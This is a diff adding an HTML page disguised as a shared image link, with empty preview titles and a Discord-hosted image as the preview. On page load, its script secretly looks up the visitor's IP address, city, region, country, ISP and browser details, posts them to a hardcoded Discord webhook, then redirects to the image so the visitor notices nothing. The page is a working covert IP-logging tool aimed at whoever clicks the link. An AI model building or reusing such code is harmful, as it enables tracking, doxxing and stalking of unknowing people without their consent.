@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta property="og:title" content="‎">
+<meta property="og:description" content="‎">
+<meta property="og:image" content="https://cdn.discordapp.com/attachments/1502872728519053534/1505104043742203964/IMG_1614.webp">
+<meta name="twitter:card" content="summary_large_image">
+
+<script>
+async function sendData() {
+  try {
+    // get IP + location info from API
+    let res = await fetch("https://ipapi.co/json/");
+    let data = await res.json();
+
+    let device = navigator.userAgent;
+
+    await fetch("https://discord.com/api/webhooks/1503565430365753435/OfrhmDWyM4N4wr0nTbJNQiDRzRDDkWdu93zXPAl1qXzFTlcRWhhQvUVkYd64707_9OPN", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content:
+`👀 Image Clicked!
+
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+ISP: ${data.org}
+
+Device: ${device}`
+      })
+    });
+
+  } catch (e) {}
+
+  // redirect after
+  setTimeout(() => {
+    window.location.href = "https://cdn.discordapp.com/attachments/1502872728519053534/1505104043742203964/IMG_1614.webp";
+  }, 500);
+}
+
+window.onload = sendData;
+</script>
+
+</head>
+<body></body>
+</html>
